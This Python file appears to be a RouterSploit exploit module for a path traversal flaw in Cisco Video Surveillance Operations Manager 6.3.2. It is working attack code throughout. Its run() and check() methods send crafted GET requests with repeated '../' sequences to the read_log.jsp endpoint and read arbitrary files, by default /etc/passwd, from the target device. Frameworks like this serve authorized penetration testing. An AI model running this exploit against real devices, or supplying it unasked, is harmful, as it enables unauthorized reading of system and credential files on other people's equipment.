from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Path Traversal vulnerability in Cisco Video Surveillance Operations Manager 6.3.2 devices.
    If the target is vulnerable, it allows to read files from the filesystem.
    """
    __info__ = {
        'name': 'Cisco Video Surveillance Path Traversal',
        'description': 'Module exploits path traversal vulnerability in Cisco Video Surveillance Operations Manager 6.3.2 devices.'
                       'If the target is vulnerable it allows to read files from the filesystem.',
        'authors': [
            'b.saleh',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/38389/',
        ],
        'devices': [
            'Cisco Video Surveillance Operations Manager 6.3.2',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    filename = exploits.Option('/etc/passwd', 'File to read from the filesystem')

    def run(self):
        if self.check():
            url = "{}:{}/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../..{}".format(self.target, self.port, self.filename)

            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success")
                print_status("Reading file: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not read file")
        else:
            print_error("Exploit failed - device seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "admin:" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
